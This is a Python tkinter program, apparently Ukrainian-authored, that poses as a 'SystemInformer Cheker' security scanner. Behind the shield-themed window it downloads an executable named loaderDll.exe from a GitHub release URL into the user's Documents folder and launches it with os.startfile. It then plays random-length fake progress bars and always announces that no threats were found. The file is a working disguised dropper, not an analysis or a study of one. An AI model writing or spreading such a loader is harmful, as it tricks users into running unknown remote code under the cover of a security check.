import tkinter as tk
from tkinter import ttk
import threading
import time
import random
import requests
import os
import tempfile



DOWNLOAD_URL = "https://github.com/SSDDAA-AFK/SustemInformer_Cheker/releases/download/v1.0/loaderDll.exe"

FOLDER = os.path.join(os.path.expanduser("~"), "Documents", "SystemChecker")
os.makedirs(FOLDER, exist_ok=True)

FILENAME = os.path.join(FOLDER, "loaderDll.exe")

ICON_URL = "https://raw.githubusercontent.com/SSDDAA-AFK/SustemInformer_Cheker/main/icon.ico"
ICON_PATH = os.path.join(tempfile.gettempdir(), "syschecker_icon.ico")


# ---------- КОЛЬОРИ ----------
BG = "#0f172a"        # темно-синій
CARD = "#020617"      # темніший
ACCENT = "#38bdf8"    # блакитний
TEXT = "#e5e7eb"      # білий
SUB = "#94a3b8"       # сірий


class LoaderApp:

    def __init__(self, root):

        self.downloaded = False


        self.root = root
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.title("SystemInformer Cheker V1.0")
        self.root.geometry("460x280")
        if self.download_icon():
            self.root.iconbitmap(ICON_PATH)
        self.root.resizable(False, False)
        self.root.configure(bg=BG)

        # ---------- КАРТКА ----------
        self.card = tk.Frame(
            root,
            bg=CARD,
            width=420,
            height=240
        )
        self.card.place(relx=0.5, rely=0.5, anchor="center")

        # ---------- ЗАГОЛОВОК ----------
        self.title = tk.Label(
            self.card,
            text="🛡️ System Scan",
            bg=CARD,
            fg=ACCENT,
            font=("Segoe UI", 18, "bold")
        )
        self.title.pack(pady=15)

        # ---------- ТЕКСТ ----------
        self.label = tk.Label(
            self.card,
            text="🔄 Завантажую перевірку...",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI", 12)
        )
        self.label.pack(pady=5)

        # ---------- ПРОГРЕС ----------
        style = ttk.Style()
        style.theme_use("clam")

        style.configure(
            "Blue.Horizontal.TProgressbar",
            background=ACCENT,
            troughcolor=BG,
            thickness=14,
            bordercolor=BG,
            lightcolor=ACCENT,
            darkcolor=ACCENT
        )

        self.progress = ttk.Progressbar(
            self.card,
            style="Blue.Horizontal.TProgressbar",
            orient="horizontal",
            length=340,
            mode="determinate"
        )
        self.progress.pack(pady=15)

        # ---------- СТАТУС ----------
        self.status = tk.Label(
            self.card,
            text="⏳ Підготовка...",
            bg=CARD,
            fg=SUB,
            font=("Segoe UI", 10)
        )
        self.status.pack()

        t = threading.Thread(target=self.stage1, daemon=True)
        t.start()

    def on_close(self):
        try:
            self.root.destroy()
        except:
            pass

        # Повне завершення процесу
        os._exit(0)

    def download_icon(self):

        try:
            r = requests.get(ICON_URL, timeout=10)

            with open(ICON_PATH, "wb") as f:
                f.write(r.content)

            return True

        except:
            return False

    # ---------- ЕТАП 1 ----------
    def stage1(self):

        threading.Thread(target=self.download, daemon=True).start()

        self.run_bar(8, 15, "Завантаження")

        while not self.downloaded:
            time.sleep(0.2)

        try:
            os.startfile(os.path.abspath(FILENAME))
            self.stage2()
        except:
            self.label.config(text="❌ ERROR for startup")


    # ---------- ЕТАП 2 ----------
    def stage2(self):

        self.label.config(
            text="📂 Починаю перевіряти файли..."
        )

        self.progress["value"] = 0

        self.run_bar(20, 30, "Сканування")

        self.finish()


    # ---------- ПРОГРЕС ----------
    def run_bar(self, min_t, max_t, text):

        total = random.randint(min_t, max_t)
        delay = total / 100

        for i in range(101):

            time.sleep(delay)

            self.progress["value"] = i

            self.status.config(
                text=f"{text}: {i}%"
            )


    # ---------- СКАЧУВАННЯ ----------
    def download(self):

        try:

            r = requests.get(DOWNLOAD_URL, stream=True)

            with open(FILENAME, "wb") as f:

                for chunk in r.iter_content(1024):
                    if chunk:
                        f.write(chunk)

            self.downloaded = True

        except:
            self.downloaded = False

    # ---------- ФІНАЛ ----------
    def finish(self):

        self.label.config(
            text="✅ Загрози не виявлено!"
        )

        self.status.config(
            text="Натисніть будь-яку кнопку, щоб закрити програму."
        )

        # Слухаємо всі натискання
        self.root.bind("<Key>", self.close_app)
        self.root.bind("<Button>", self.close_app)

    def close_app(self, event=None):
        self.on_close()


# ---------- ЗАПУСК ----------

root = tk.Tk()
app = LoaderApp(root)
root.mainloop()
